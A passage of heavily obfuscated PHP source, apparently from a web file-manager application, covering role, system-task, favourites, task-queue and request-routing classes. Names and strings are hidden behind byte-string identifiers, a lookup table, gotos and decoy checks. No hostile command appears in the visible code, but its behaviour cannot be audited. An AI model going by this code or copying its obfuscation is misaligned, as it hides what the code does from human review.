$®ãÅ§óÈ[$ÍÑï®Ï“[399]]) { return !1; } if ($ÔŞ´ùŞØ[$ÍÑï®Ï“[2026]] == 1) { $‹Äê³àÀ = array($ÍÑï®Ï“[32] => $‹Äê³àÀ[$ÍÑï®Ï“[32]], $ÍÑï®Ï“[1851] => $‹Äê³àÀ[$ÍÑï®Ï“[1851]]); } $this->filterAuth($‹Äê³àÀ[$ÍÑï®Ï“[413]]); return parent::update($Æ¢ó£¿”, $‹Äê³àÀ); } public function remove($­ĞÀï«Ñ) { $ğäßõÏı = parent::listData($­ĞÀï«Ñ); if (!$ğäßõÏı || $ğäßõÏı[$_SERVER[ßğøİ][1276]]) { return !1; } return parent::remove($­ĞÀï«Ñ); } public function add($„İÜ‘ö–) { $ş³Å‡¼ =& $_SERVER[ßğøİ]; $ñ±Ë™œ = $„İÜ‘ö–[$ş³Å‡¼[32]]; if ($this->findByName($ñ±Ë™œ)) { return !1; } $ÃÁ»Øä« = array($ş³Å‡¼[420] => $ñ±Ë™œ, $ş³Å‡¼[1834] => $ş³Å‡¼[12], $ş³Å‡¼[1830] => $ş³Å‡¼[1838], $ş³Å‡¼[2261] => 1, $ş³Å‡¼[1833] => 0, $ş³Å‡¼[2262] => 0, $ş³Å‡¼[1832] => $this->getSort()); $„İÜ‘ö– = array_merge($ÃÁ»Øä«, $„İÜ‘ö–); $this->filterAuth($„İÜ‘ö–[$ş³Å‡¼[413]]); return parent::insert($„İÜ‘ö–); } private function getSort() { $Áœ¾èº¨ =& $_SERVER[ßğøİ]; $Ê±ÓÇ“ = parent::listData(); $ğ¼ïÀë¸ = array_to_keyvalue($Ê±ÓÇ“, $Áœ¾èº¨[12], $Áœ¾èº¨[1852]); return empty($ğ¼ïÀë¸) ? 0 : max($ğ¼ïÀë¸) + 1; } private function filterAuth(&$¯Ô×ÎŸÔ) { $Ğ‡´ÏÂ— =& $_SERVER[ßğøİ]; $ÇÎŠùÉ = array(); $œ·ûèƒ = array_filter(explode($Ğ‡´ÏÂ—[50], $¯Ô×ÎŸÔ)); foreach ($œ·ûèƒ as $¯Ô×ÎŸÔ) { $é¥¥Ğƒó = explode($Ğ‡´ÏÂ—[10], $¯Ô×ÎŸÔ); if ($é¥¥Ğƒó[0] == $Ğ‡´ÏÂ—[2263] && $é¥¥Ğƒó[1] != $Ğ‡´ÏÂ—[1195]) { $ææÂæè° = $é¥¥Ğƒó[0] . $Ğ‡´ÏÂ—[10] . $é¥¥Ğƒó[1] . $Ğ‡´ÏÂ—[2264]; if (!in_array($ææÂæè°, $œ·ûèƒ)) { $ÇÎŠùÉ[] = $ææÂæè°; } } $ÇÎŠùÉ[] = $¯Ô×ÎŸÔ; } $¯Ô×ÎŸÔ = implode($Ğ‡´ÏÂ—[50], $ÇÎŠùÉ); } public function findRoleDefault() { $‡ÙØŸµñ =& $_SERVER[ßğøİ]; $ìÈÆ›¿Ü = parent::listData(); $Ú„êÛøÕ = !1; foreach ($ìÈÆ›¿Ü as $Ğ¤²Œë) { if (!$Ğ¤²Œë || $Ğ¤²Œë[$‡ÙØŸµñ[1850]] == $‡ÙØŸµñ[197] || $Ğ¤²Œë[$‡ÙØŸµñ[2026]] == 1) { continue; } if (strstr($Ğ¤²Œë[$‡ÙØŸµñ[413]], $‡ÙØŸµñ[2265])) { continue; } if (!strstr($Ğ¤²Œë[$‡ÙØŸµñ[413]], $‡ÙØŸµñ[2266])) { continue; } if (!$Ú„êÛøÕ) { $Ú„êÛøÕ = $Ğ¤²Œë; continue; } $è¥³Ó¼¾ = explode($‡ÙØŸµñ[50], $Ú„êÛøÕ[$‡ÙØŸµñ[413]]); $”¦¬ü•µ = explode($‡ÙØŸµñ[50], $Ğ¤²Œë[$‡ÙØŸµñ[413]]); if (count($è¥³Ó¼¾) > count($”¦¬ü•µ)) { $Ú„êÛøÕ = $Ğ¤²Œë; } } return $Ú„êÛøÕ ? $Ú„êÛøÕ[$‡ÙØŸµñ[399]] : $‡ÙØŸµñ[12]; } public function sort($ƒØ…ñü, $åİğ˜‡Ğ) { return parent::update($ƒØ…ñü, $åİğ˜‡Ğ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\56\164\x61\x73\153\114\151\x73\164"; public $field = array("\156\141\x6d\145", "\x74\171\x70\x65", "\x65\166\x65\156\x74", "\x74\151\155\x65", "\x64\x65\x73\143", "\x73\x79\x73\x74\x65\x6d", "\x65\156\x61\142\x6c\145", "\154\141\x73\x74\122\x75\156", "\163\x6f\x72\164"); public function listData($’îôÎÇ = false, $Í¨Øıßƒ = "\x73\x6f\162\x74", $ô è¦±è = false) { return parent::listData($’îôÎÇ, $Í¨Øıßƒ, $ô è¦±è); } public function add($¶…˜éÏ) { $µ›¡ãò =& $_SERVER[ßğøİ]; $”ô²®ÂŒ = $this->findByName($¶…˜éÏ[$µ›¡ãò[32]]); if ($”ô²®ÂŒ) { return !1; } $¶…˜éÏ[$µ›¡ãò[1615]] = 0; $¶…˜éÏ[$µ›¡ãò[1852]] = $this->getSort(); return parent::insert($¶…˜éÏ); } private function getSort() { $³—·×Ş =& $_SERVER[ßğøİ]; $”’Ôä†ˆ = parent::listData(); $Û¼ÇÏé = array_to_keyvalue($”’Ôä†ˆ, $³—·×Ş[12], $³—·×Ş[1852]); return empty($Û¼ÇÏé) ? 0 : max($Û¼ÇÏé) + 1; } public function update($òÄµ±‰Œ, $±·à·¯) { $æö·ô‚” =& $_SERVER[ßğøİ]; $î¾İÑ’ = $this->listData($òÄµ±‰Œ); $Û×ä—ÈÈ = $this->findByName($±·à·¯[$æö·ô‚”[32]]); if (!$î¾İÑ’ || $Û×ä—ÈÈ && $Û×ä—ÈÈ[$æö·ô‚”[399]] != $î¾İÑ’[$æö·ô‚”[399]]) { return !1; } return parent::update($òÄµ±‰Œ, $±·à·¯); } public function remove($Ú½ü¤È, $Ô¼ıÊØˆ = false) { $ß¹±û¯ =& $_SERVER[ßğøİ]; $Ö¢ïªìô = $this->listData($Ú½ü¤È); if (!$Ö¢ïªìô) { return; } if (!$Ô¼ıÊØˆ && $Ö¢ïªìô[$ß¹±û¯[1276]] == $ß¹±û¯[88]) { return !1; } return parent::remove($Ú½ü¤È); } public function enable($ôºáºêŞ, $†û«˜ä) { return $this->update($ôºáºêŞ, array($_SERVER[ßğøİ][2255] => $†û«˜ä)); } public function run($ä€ò¿ÚÖ) { return $this->update($ä€ò¿ÚÖ, array($_SERVER[ßğøİ][2267] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\x66\x61\166"; protected function cacheFunctionAlias($Ò¨æÂøî) { $¨ù±›ûî =& $_SERVER[ßğøİ]; return array($¨ù±›ûî[1939] => array(USER_ID, $¨ù±›ûî[2268])); } protected function listData() { $øù‰î› =& $_SERVER[ßğøİ]; $Ã¤ó„Õƒ = array($øù‰î›[1646] => USER_ID, $øù‰î›[484] => 0); $ÖÈçøÀ¼ = $øù‰î›[2269]; $²åõı‡ı = $this->field($ÖÈçøÀ¼)->where($Ã¤ó„Õƒ)->order($øù‰î›[2270])->select(); return $²åõı‡ı ? $²åõı‡ı : array(); } protected function resetCache() { } protected function listView() { $¡å§É€Š =& $_SERVER[ßğøİ]; $ú¼»×‰ü = $this->listData(); $ß€ëÅøå = array_filter_by_field($ú¼»×‰ü, $¡å§É€Š[33], $¡å§É€Š[416]); $Ë—ÙÏ± = array_to_keyvalue($ß€ëÅøå, $¡å§É€Š[12], $¡å§É€Š[84]); if (!$Ë—ÙÏ±) { return $ú¼»×‰ü; } $ä“¨«›ˆ = 2000; $©Áé’Ôµ = array($¡å§É€Š[417] => array($¡å§É€Š[418], $Ë—ÙÏ±)); $§áŞ­º = Model($¡å§É€Š[822])->listSource($©Áé’Ôµ, $ä“¨«›ˆ); $§áŞ­º = array_merge($§áŞ­º[$¡å§É€Š[83]], $§áŞ­º[$¡å§É€Š[82]]); $§áŞ­º = array_to_keyvalue($§áŞ­º, $¡å§É€Š[402]); foreach ($ú¼»×‰ü as $¸²¸šõ => $ÌğÂüô€) { $¸ñÚœŠ× = $§áŞ­º[$ÌğÂüô€[$¡å§É€Š[84]]]; $¸ñÚœŠ× = $¸ñÚœŠ× ? $¸ñÚœŠ× : array(); $ú¼»×‰ü[$¸²¸šõ] = array_merge($¸ñÚœŠ×, $ÌğÂüô€); } return $ú¼»×‰ü; } protected function addFav($Ì†üóá, $ºğË¸¨À = '', $™ÏøÄ¡„ = "\163\157\x75\x72\143\x65") { $ƒêÚß§‚ =& $_SERVER[ßğøİ]; $²–Êä‘Î = array($ƒêÚß§‚[1646] => USER_ID, $ƒêÚß§‚[484] => 0, $ƒêÚß§‚[422] => $™ÏøÄ¡„, $ƒêÚß§‚[421] => $Ì†üóá); if ($this->where($²–Êä‘Î)->find()) { return !1; } $²–Êä‘Î = array($ƒêÚß§‚[1646] => USER_ID, $ƒêÚß§‚[484] => 0); $Ş¹©õƒ = $this->where($²–Êä‘Î)->max($ƒêÚß§‚[1852]); if (!$Ş¹©õƒ) { $Ş¹©õƒ = 0; } if (!$ºğË¸¨À && $™ÏøÄ¡„ == $ƒêÚß§‚[416]) { $ıÜ·Øñæ = Model($ƒêÚß§‚[1327])->where(array($ƒêÚß§‚[417] => $Ì†üóá))->find(); if (!$ıÜ·Øñæ) { return !1; } $ºğË¸¨À = $ıÜ·Øñæ[$ƒêÚß§‚[32]]; } $ºğË¸¨À = $this->getAutoName($ºğË¸¨À); $ÌşÈÍË– = array($ƒêÚß§‚[1646] => USER_ID, $ƒêÚß§‚[484] => 0, $ƒêÚß§‚[420] => $ºğË¸¨À, $ƒêÚß§‚[421] => $Ì†üóá, $ƒêÚß§‚[422] => $™ÏøÄ¡„, $ƒêÚß§‚[1832] => $Ş¹©õƒ + 1); return $this->add($ÌşÈÍË–); } protected function remove($ı¡ÂÛ†‰) { $áò’ÛÎ =& $_SERVER[ßğøİ]; $¿¨˜›”¤ = array($áò’ÛÎ[1646] => USER_ID, $áò’ÛÎ[419] => $ı¡ÂÛ†‰); return $this->where($¿¨˜›”¤)->delete(); } protected function removeByName($åØ»”›€) { $˜èó¤´ =& $_SERVER[ßğøİ]; $™ÕïÃÑ¦ = array($˜èó¤´[1646] => USER_ID, $˜èó¤´[420] => $åØ»”›€, $˜èó¤´[484] => 0); return $this->where($™ÕïÃÑ¦)->delete(); } protected function rename($¬ÇÔ”Õ, $ï¦Å–ıÛ) { $öØ»ÊÖİ =& $_SERVER[ßğøİ]; if ($¬ÇÔ”Õ == $ï¦Å–ıÛ) { return !1; } $°àÏÏæÅ = $this->getAutoName($ï¦Å–ıÛ); if ($ï¦Å–ıÛ != $°àÏÏæÅ) { return !1; } $Æ¥êÔµ™ = array($öØ»ÊÖİ[1646] => USER_ID, $öØ»ÊÖİ[484] => 0, $öØ»ÊÖİ[32] => $¬ÇÔ”Õ); return $this->where($Æ¥êÔµ™)->save(array($öØ»ÊÖİ[32] => $ï¦Å–ıÛ)); } protected function resetSort($¨åä£) { $Ñšœ”û¤ =& $_SERVER[ßğøİ]; $¨åä£ = is_array($¨åä£) ? $¨åä£ : array(); $õ¯¹êéê = array($Ñšœ”û¤[1646] => USER_ID); for ($ù”ı‹ƒû = 0; $ù”ı‹ƒû < count($¨åä£); $ù”ı‹ƒû++) { $õ¯¹êéê[$Ñšœ”û¤[419]] = $¨åä£[$ù”ı‹ƒû]; $this->where($õ¯¹êéê)->save(array($Ñšœ”û¤[1832] => $ù”ı‹ƒû + 1)); } return !0; } protected function moveTop($ü›”œü) { $´²å´¼ö =& $_SERVER[ßğøİ]; $Íú”ôİ = array($´²å´¼ö[1646] => USER_ID, $´²å´¼ö[484] => 0); $¤ÈæıÜÕ = $this->where($Íú”ôİ)->where(array($´²å´¼ö[32] => $ü›”œü))->find(); if (!$¤ÈæıÜÕ) { return; } $áâŒ¥–× = $this->field($´²å´¼ö[399])->where($Íú”ôİ)->order($´²å´¼ö[2270])->select(); $áâŒ¥–× = array_to_keyvalue($áâŒ¥–×, $´²å´¼ö[12], $´²å´¼ö[399]); $Ô–ÚÑ…Ó = $áâŒ¥–×; $áâŒ¥–× = array_remove_value($áâŒ¥–×, $¤ÈæıÜÕ[$´²å´¼ö[399]]); array_unshift($áâŒ¥–×, $¤ÈæıÜÕ[$´²å´¼ö[399]]); return $this->resetSort($áâŒ¥–×); } protected function moveBottom($ˆ­¨£ ô) { $ÀŞÅê =& $_SERVER[ßğøİ]; $àø¦¿û = array($ÀŞÅê[1646] => USER_ID, $ÀŞÅê[484] => 0); $ª°á²™­ = $this->where($àø¦¿û)->max($ÀŞÅê[1852]); $Ÿû¬äÓ© = array($ÀŞÅê[1852] => $ª°á²™­ + 1); return $this->where($àø¦¿û)->where(array($ÀŞÅê[32] => $ˆ­¨£ ô))->save($Ÿû¬äÓ©); } private function getAutoName($€ß‰÷èÆ) { $çŞ¦‚ï =& $_SERVER[ßğøİ]; $—¦˜¾èä = array($çŞ¦‚ï[1646] => USER_ID, $çŞ¦‚ï[484] => 0); $ó¦Ğ‡ = $this->field($çŞ¦‚ï[32])->where($—¦˜¾èä)->select(); $ó¦Ğ‡ = array_to_keyvalue($ó¦Ğ‡, $çŞ¦‚ï[12], $çŞ¦‚ï[32]); if (!$ó¦Ğ‡ || !in_array($€ß‰÷èÆ, $ó¦Ğ‡)) { return $€ß‰÷èÆ; } for ($¸¤ŠñáÖ = 0; $¸¤ŠñáÖ < count($ó¦Ğ‡); $¸¤ŠñáÖ++) { if (!in_array($€ß‰÷èÆ . "\50{$¸¤ŠñáÖ}\51", $ó¦Ğ‡)) { return $€ß‰÷èÆ . "\50{$¸¤ŠñáÖ}\51"; } } return $€ß‰÷èÆ . "\x28{$¸¤ŠñáÖ}\51"; } } goto bš·øÄé“–; DÎ¦ôÜ°¸¦: define($_SERVER[ßğøİ][241], 1); define($_SERVER[ßğøİ][242], 0); define($_SERVER[ßğøİ][243], 2); goto B…À¤‚™òŠ; d½ÃÆ±ˆ‘: class TaskHttp extends Task { protected function startAfter() { $÷ĞğßŞ÷ =& $_SERVER[ßğøİ]; $ƒâ¹¾ƒ =& $this->task; $ƒâ¹¾ƒ[$÷ĞğßŞ÷[1730]] = 1; Hook::bind($÷ĞğßŞ÷[1698], array($this, $÷ĞğßŞ÷[1731])); Hook::bind($÷ĞğßŞ÷[1700], array($this, $÷ĞğßŞ÷[1732])); Hook::bind($÷ĞğßŞ÷[1702], array($this, $÷ĞğßŞ÷[1733])); } protected function endAfter() { $Ì™İ¹å´ =& $_SERVER[ßğøİ]; Hook::unbind($Ì™İ¹å´[1698], array($this, $Ì™İ¹å´[1731])); Hook::unbind($Ì™İ¹å´[1700], array($this, $Ì™İ¹å´[1732])); Hook::unbind($Ì™İ¹å´[1702], array($this, $Ì™İ¹å´[1733])); } public function progressStart($èƒ£§­) { $Ä£ŸÚ¡Ô =& $_SERVER[ßğøİ]; $Ï¾ŠËĞ = curl_getinfo($èƒ£§­); self::log($Ä£ŸÚ¡Ô[1734] . $Ï¾ŠËĞ[$Ä£ŸÚ¡Ô[307]]); self::valueSet($this->task[$Ä£ŸÚ¡Ô[399]], $this->task); } public function progressEnd($•¤Ô¢»¥) { $®Îöì¡ =& $_SERVER[ßğøİ]; self::log($®Îöì¡[1735] . $this->task[$®Îöì¡[399]]); $this->end(); } public function progress($Ä“½‹×ß, $¦€ ¼ŠĞ, $Ò—ÌÍ„É, $ñ‘ƒ¥Ìß, $çñèù“) { $û®®«ÌÑ =& $_SERVER[ßğøİ]; $şÅ˜Éî® =& $this->task; if ($çñèù“ > 0) { $şÅ˜Éî®[$û®®«ÌÑ[783]] = $şÅ˜Éî®[$û®®«ÌÑ[783]] == 0 ? $ñ‘ƒ¥Ìß : $şÅ˜Éî®[$û®®«ÌÑ[783]]; $şÅ˜Éî®[$û®®«ÌÑ[1656]] = $çñèù“; } else { if ($Ò—ÌÍ„É > 0) { $şÅ˜Éî®[$û®®«ÌÑ[783]] = $şÅ˜Éî®[$û®®«ÌÑ[783]] == 0 ? $¦€ ¼ŠĞ : $şÅ˜Éî®[$û®®«ÌÑ[783]]; $şÅ˜Éî®[$û®®«ÌÑ[1656]] = $Ò—ÌÍ„É; } } $this->update(); self::log("\x70\162\157\x67\162\145\163\x73\x48\164\x74\x70\x3a\144\157\x77\156\x3a{$Ò—ÌÍ„É}\57{$¦€ ¼ŠĞ}\x3b\x20\165\x70\154\x6f\141\x64\72{$çñèù“}\x2f{$ñ‘ƒ¥Ìß}\x3b"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\x6b\x51\165\145\165\145\114\145\156\x67\164\x68"; const QUEUE_DATA = "\x74\x61\163\153\121\x75\145\x75\x65\104\141\164\141"; public static $listData = false; public static function initTask() { } public static function add($¢İŒÊØ, $ÃŸı—½à = array(), $–ÂüÒâù = '', $ªõµ‡ã¬ = '') { $¥‘Ó•Ë =& $_SERVER[ßğøİ]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ªõµ‡ã¬ && array_find_by_field(self::$listData, $¥‘Ó•Ë[94], $ªõµ‡ã¬)) { return !0; } self::$listData[] = array($¥‘Ó•Ë[264] => $¢İŒÊØ, $¥‘Ó•Ë[1736] => $ÃŸı—½à, $¥‘Ó•Ë[453] => $–ÂüÒâù, $¥‘Ó•Ë[94] => $ªõµ‡ã¬); return !0; } public static function addSubmit() { $×ÛóŞ˜ =& $_SERVER[ßğøİ]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($×ÛóŞ˜[1737] . json_encode_force(array_to_keyvalue(self::$listData, $×ÛóŞ˜[12], $×ÛóŞ˜[453])), $×ÛóŞ˜[1738]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($ªç¤¤º³, $»×ç©‚³ = array(), $¶…³•ù½ = '', $Î‘éÁ·Û = '') { $äóÆ – =& $_SERVER[ßğøİ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ôÂÙ©÷· = self::getAll(); if ($Î‘éÁ·Û && array_find_by_field($ôÂÙ©÷·, $äóÆ –[94], $Î‘éÁ·Û)) { return !0; } $ôÂÙ©÷·[] = array($äóÆ –[264] => $ªç¤¤º³, $äóÆ –[1736] => $»×ç©‚³, $äóÆ –[453] => $¶…³•ù½, $äóÆ –[94] => $Î‘éÁ·Û); write_log($äóÆ –[1737] . $¶…³•ù½, $äóÆ –[1738]); self::setAll($ôÂÙ©÷·); return !0; } public static function run() { $¿Ü¿Íãº =& $_SERVER[ßğøİ]; $‚ÁĞë»Ê = self::getAll(); $ÍÚÕ¾’ = array_shift($‚ÁĞë»Ê); if (!$ÍÚÕ¾’) { return !1; } self::setAll($‚ÁĞë»Ê); $±ÓÛŒ¯ = timeFloat(); try { Hook::apply($ÍÚÕ¾’[$¿Ü¿Íãº[264]], $ÍÚÕ¾’[$¿Ü¿Íãº[1736]]); } catch (Exception $ë¾·¹ˆ) { } $ˆëÏİÎ = number_format(timeFloat() - $±ÓÛŒ¯, 3) . $¿Ü¿Íãº[1671]; write_log($¿Ü¿Íãº[1739] . $ÍÚÕ¾’[$¿Ü¿Íãº[453]] . $¿Ü¿Íãº[1740] . $ˆëÏİÎ, $¿Ü¿Íãº[1738]); return !0; } public static function count() { $öùŸ†âà = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$öùŸ†âà) { return 0; } return intval($öùŸ†âà); } public static function getAll() { $š¿¥ä°ß = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$š¿¥ä°ß) { return array(); } return $š¿¥ä°ß; } public static function setAll($³Ò³¶é£) { $í¾Ç³‡Í = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($³Ò³¶é£), $í¾Ç³‡Í); Cache::set(self::QUEUE_DATA, $³Ò³¶é£, $í¾Ç³‡Í); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($øìË–’Ÿ, $Ìˆ ÓñØ = 5.0) { if (!$øìË–’Ÿ) { return; } $™¾şï›ø = Cache::get($øìË–’Ÿ); if (!$™¾şï›ø || timeFloat() - floatVal($™¾şï›ø) >= $Ìˆ ÓñØ) { Cache::set($øìË–’Ÿ, timeFloat(), $Ìˆ ÓñØ * 10); return !0; } return !1; } public static function timeLimitCall($øçóÇú, $ïÒ–¯úé, $£§Ïê¦Ú, $úç¶•í´ = 5.0) { $»Î§ü¨ô =& $_SERVER[ßğøİ]; if (!$øçóÇú || !$ïÒ–¯úé) { return; } self::$asyncAdd = !0; $¢Æ–¯¶ğ = $»Î§ü¨ô[1741]; $Ó¢„‚ú = Cache::get($¢Æ–¯¶ğ, !0); $«¢’Í†’ = array($»Î§ü¨ô[1742] => timeFloat(), $»Î§ü¨ô[1743] => timeFloat(), $»Î§ü¨ô[264] => $ïÒ–¯úé, $»Î§ü¨ô[1736] => $£§Ïê¦Ú, $»Î§ü¨ô[203] => $úç¶•í´); if (is_array($Ó¢„‚ú[$øçóÇú])) { $«¢’Í†’[$»Î§ü¨ô[1743]] = $Ó¢„‚ú[$øçóÇú][$»Î§ü¨ô[1743]]; } if (is_array($Ó¢„‚ú[$øçóÇú])) { if (timeFloat() - $Ó¢„‚ú[$øçóÇú][$»Î§ü¨ô[1742]] < $«¢’Í†’[$»Î§ü¨ô[203]] * 0.3) { return; } $«¢’Í†’[$»Î§ü¨ô[1743]] = $Ó¢„‚ú[$øçóÇú][$»Î§ü¨ô[1743]]; } $Ó¢„‚ú[$øçóÇú] = $«¢’Í†’; Cache::set($¢Æ–¯¶ğ, $Ó¢„‚ú, 60); Cache::removeMemory($¢Æ–¯¶ğ); write_log($»Î§ü¨ô[1744] . $øçóÇú . $»Î§ü¨ô[71] . $ïÒ–¯úé, $»Î§ü¨ô[1738]); } public static function timeLimitCallLoop() { $¬ãœïÃ =& $_SERVER[ßğøİ]; $ô¦ÒŒé = array($¬ãœïÃ[1745]); $·°Ûöİ = in_array(strtolower(ACTION), $ô¦ÒŒé); if (!$·°Ûöİ && !self::$asyncAdd) { return; } $–Ñ”šåÕ = $¬ãœïÃ[1741]; $”ê©Î—Å = Cache::get($–Ñ”šåÕ, !0); if (!$”ê©Î—Å || count($”ê©Î—Å) <= 0) { return; } $òûí„·ß = !1; $Š„›ÅÓ² = timeFloat(); $éù‰‘ÓÄ = array(); foreach ($”ê©Î—Å as $Ç£›İˆœ => $®Ñ†”–Ÿ) { if ($Š„›ÅÓ² - $®Ñ†”–Ÿ[$¬ãœïÃ[1743]] > $®Ñ†”–Ÿ[$¬ãœïÃ[203]]) { $òûí„·ß = !0; try { Hook::apply($®Ñ†”–Ÿ[$¬ãœïÃ[264]], $®Ñ†”–Ÿ[$¬ãœïÃ[1736]]); write_log($¬ãœïÃ[1746] . $Ç£›İˆœ . $¬ãœïÃ[71] . $®Ñ†”–Ÿ[$¬ãœïÃ[264]] . $¬ãœïÃ[1747] . ACTION, $¬ãœïÃ[1738]); } catch (Exception $ıÖı¼Ïò) { } continue; } $éù‰‘ÓÄ[$Ç£›İˆœ] = $®Ñ†”–Ÿ; } if (!$òûí„·ß) { return; } if (!$éù‰‘ÓÄ) { return Cache::remove($–Ñ”šåÕ); } Cache::set($–Ñ”šåÕ, $éù‰‘ÓÄ, 60); Cache::removeMemory($–Ñ”šåÕ); } public static function finished($İ‰üéñÂ, $ÃŒãÔàÌ) { $ú¤îÓÆÀ =& $_SERVER[ßğøİ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ú¤îÓÆÀ[264] => $İ‰üéñÂ, $ú¤îÓÆÀ[1736] => $ÃŒãÔàÌ); } private static function finishedRun() { $ñ¦û‚‘Ã =& $_SERVER[ßğøİ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $šìÅĞ) { try { Hook::apply($šìÅĞ[$ñ¦û‚‘Ã[264]], $šìÅĞ[$ñ¦û‚‘Ã[1736]]); } catch (Exception $Ğ«–úş) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto CÚùÕÙÑÓ; bØœŞÙ­—À: class Application { private $defaultModule = "\151\x6e\144\145\x78"; private $defaultController = "\151\x6e\x64\145\170"; private $defaultAction = "\x69\156\x64\x65\170"; function __construct() { } public function setDefault($Ú‡«—ßñ) { $€ÍŠóã° =& $_SERVER[©·å†­”]; $äÍØœÀ‚ = explode($€ÍŠóã°[0], trim($Ú‡«—ßñ, $€ÍŠóã°[0])); $this->defaultModule = $äÍØœÀ‚[0] ? $äÍØœÀ‚[0] : $this->defaultModule; $this->defaultController = $äÍØœÀ‚[1] ? $äÍØœÀ‚[1] : $this->defaultController; $this->defaultAction = $äÍØœÀ‚[2] ? $äÍØœÀ‚[2] : $this->defaultAction; $this->sgzb3b30794e($€ÍŠóã°[1], array($this, $€ÍŠóã°[2])); } public function appRun($âöÒ§­) { $ƒó¯›¤ =& $_SERVER[ßğøİ]; $¨Öá´²Å =& $_SERVER[©·å†­”]; $ñ¯˜îáÈ = explode($¨Öá´²Å[0], $âöÒ§­); $åü©è¾Š = $ƒó¯›¤[619]; while ($åü©è¾Š < $ƒó¯›¤[620]) { if ($åü©è¾Š >= 0) { break; } $åü©è¾Š++; } $®ÙçÎ ñ = strtolower($ñ¯˜îáÈ[0]); $§ÄæÒ¡È = $¨Öá´²Å[3]; if ($®ÙçÎ ñ == $¨Öá´²Å[4]) { $§ÄæÒ¡È = $¨Öá´²Å[5]; $ñ¯˜îáÈ[0] = $¨Öá´²Å[6]; $ñ¯˜îáÈ[1] = $ñ¯˜îáÈ[1] . $¨Öá´²Å[7]; $âöÒ§­ = join($¨Öá´²Å[0], $ñ¯˜îáÈ); $âöÒ§­ = trim($âöÒ§­, $¨Öá´²Å[0]); } call_user_func(array($¨Öá´²Å[8], $¨Öá´²Å[9]), $§ÄæÒ¡È . $¨Öá´²Å[10], $âöÒ§­); ActionCall($âöÒ§­); call_user_func(array($¨Öá´²Å[8], $¨Öá´²Å[9]), $§ÄæÒ¡È . $¨Öá´²Å[11], $âöÒ§­); } private function autorun() { $££Œ¯À± =& $_SERVER[ßğøİ]; $‚ü¼úñœ =& $_SERVER[©·å†­”]; global $config; $˜Š•ôñß = $££Œ¯À±[621]; while ($˜Š•ôñß < $££Œ¯À±[620]) { if ($˜Š•ôñß >= 0) { break; } $˜Š•ôñß++; } if (count($config[$‚ü¼úñœ[12]]) == 0) { return; } foreach ($config[$‚ü¼úñœ[12]] as $ú“üŒò  => $œ¢…ë³²) { $this->appRun($œ¢…ë³²); } } private function wzdu3a790c19() { $–­Ç×ûò =& $_SERVER[ßğøİ]; $°Ä„×²Ğ =& $_SERVER[©·å†­”]; $ö¶òÓ = $°Ä„×²Ğ[4]; $£„´ñŠß = $–­Ç×ûò[622]; while ($£„´ñŠß < $–­Ç×ûò[620]) { if ($£„´ñŠß >= 0) { break; } $£„´ñŠß++; } $İÏŞä = $GLOBALS[$°Ä„×²Ğ[13]][$°Ä„×²Ğ[14]][0]; $úÆŒ‰î² = $–­Ç×ûò[623]; if (strlen($úÆŒ‰î²) < $–­Ç×ûò[624]) { die; } if (!$İÏŞä || strlen($İÏŞä) <= strlen($ö¶òÓ)) { return; } if (strtolower(substr($İÏŞä, -strlen($ö¶òÓ))) != $ö¶òÓ) { return; } $˜ĞËŸ‘ = substr($İÏŞä, 0, -strlen($ö¶òÓ)); $‡ôäÇ—É = $–­Ç×ûò[625]; if (strlen($‡ôäÇ—É) < $–­Ç×ûò[620]) { die; } $’ã¦÷ğ… = array($°Ä„×²Ğ[4], $˜ĞËŸ‘); $¦ä·á × = $–­Ç×ûò[626]; $ı®ïù = array_slice($GLOBALS[$°Ä„×²Ğ[13]][$°Ä„×²Ğ[14]], 1); $üşÃı¹ = $–­Ç×ûò[627]; if (!$üşÃı¹) { die; } $GLOBALS[$°Ä„×²Ğ[13]][$°Ä„×²Ğ[14]] = array_merge($’ã¦÷ğ…, $ı®ïù); $GLOBALS[$°Ä„×²Ğ[13]][$°Ä„×²Ğ[15]] = implode($°Ä„×²Ğ[0], $GLOBALS[$°Ä„×²Ğ[13]][$°Ä„×²Ğ[14]]); $¿Ø¼ğØ» = $–­Ç×ûò[628]; } private function gkqm5d53be7b() { $¡ö¶øÅõ =& $_SERVER[ßğøİ]; $ÒõëáÔ¨ =& $_SERVER[©·å†­”]; if ($GLOBALS[$ÒõëáÔ¨[13]][$ÒõëáÔ¨[15]] != $ÒõëáÔ¨[6]) { return; } $µãšûœ‘ = $_SERVER[$ÒõëáÔ¨[16]]; $µÄ½šœŸ = $¡ö¶øÅõ[629]; if (!$µÄ½šœŸ) { die; } $ƒ©¯Ÿ¦¿ = $ÒõëáÔ¨[17]; if (!strstr($µãšûœ‘, $ƒ©¯Ÿ¦¿)) { return; } $¬ª©«Ã± = strrpos($µãšûœ‘, $ƒ©¯Ÿ¦¿); $åĞáÄÆÇ = $¡ö¶øÅõ[630]; if (strlen($åĞáÄÆÇ) < $¡ö¶øÅõ[631]) { return; } $Œ‰şÏÜû = substr($µãšûœ‘, $¬ª©«Ã± + strlen($ƒ©¯Ÿ¦¿)); $ü†ÅÎ™á = $¡ö¶øÅõ[632]; if (!$ü†ÅÎ™á) { die; } preg_match_all($ÒõëáÔ¨[18], $Œ‰şÏÜû, $¯“”–õù); $Œ‰şÏÜû = trim($¯“”–õù[0][0], $ÒõëáÔ¨[19]); $GLOBALS[$ÒõëáÔ¨[13]][$ÒõëáÔ¨[14]] = explode($ÒõëáÔ¨[19], $Œ‰şÏÜû); 